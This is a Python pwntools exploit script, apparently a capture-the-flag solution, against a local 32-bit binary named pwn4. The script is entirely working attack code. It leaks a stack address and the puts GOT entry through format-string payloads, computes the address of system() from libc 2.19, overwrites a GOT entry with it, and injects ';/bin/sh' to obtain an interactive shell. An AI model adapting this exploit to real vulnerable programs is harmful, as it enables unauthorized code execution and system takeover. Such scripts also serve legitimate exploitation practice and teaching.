from pwn import *
context.log_level="debug"
context.arch="i386"
p = process("./pwn4")

p.recvuntil("name:")
p.sendline("A"*0x10)
p.recvuntil("meet~")

stack = int(p.recvuntil("\n",drop=True),16)

print hex(stack)
ret = stack + 0x9c
print hex(ret)
put_got = 0x804A018
pay = p32(put_got)+"%4$s" 

pay2 = fmtstr_payload(6,{ret:0x804856E},12)
pay = pay + pay2
p.recvuntil("g say to me~")

p.sendline(pay)
print p.recvuntil("\x18\xa0\x04\x08")
puts = u32(p.recv(4))

libc = ELF("/lib/i386-linux-gnu/libc-2.19.so")

system = puts - libc.symbols['puts'] + libc.symbols['system']

sleep(2)
p.send("A"*0x20)

print hex(system)

pay = fmtstr_payload(4,{0x804a010:system,ret+4:0x0804856e},0,'short')+";/bin/sh;#"

p.send(pay)

sleep(2)
p.recvuntil("#")
sleep(1)
p.sendline("BBBBBB")

p.interactive()
